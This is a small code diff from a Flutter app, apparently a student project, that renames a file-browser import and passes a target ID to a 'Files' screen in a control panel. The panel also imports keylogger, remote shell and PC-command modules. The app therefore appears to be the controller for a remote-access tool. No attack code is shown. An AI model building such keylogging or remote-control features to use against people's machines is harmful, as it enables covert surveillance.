@@ -13,7 +13,7 @@ import 'package:inferno_core_fyp/view/controls/keylogger.dart';
 import 'package:inferno_core_fyp/view/controls/network.dart';
 import 'package:inferno_core_fyp/view/controls/pc_commands.dart';
 import 'package:inferno_core_fyp/view/controls/shell.dart';
-import 'package:inferno_core_fyp/view/controls/sys_files.dart';
+import 'package:inferno_core_fyp/view/controls/system_files.dart';
 import 'package:inferno_core_fyp/view/controls/task_manager.dart';
 
 import '../res/widgets/general widgets/dotted_strings.dart';
@@ -181,7 +181,7 @@ class _ControlPanelState extends State<ControlPanel> {
                     text: "Files",
                     icon: CupertinoIcons.folder_fill,
                     onTap: () {
-                      Get.to(() => SystemFiles());
+                      Get.to(() => SystemFiles(targetId: widget.targetId));
                     },
                   ),
                   CommandItem(
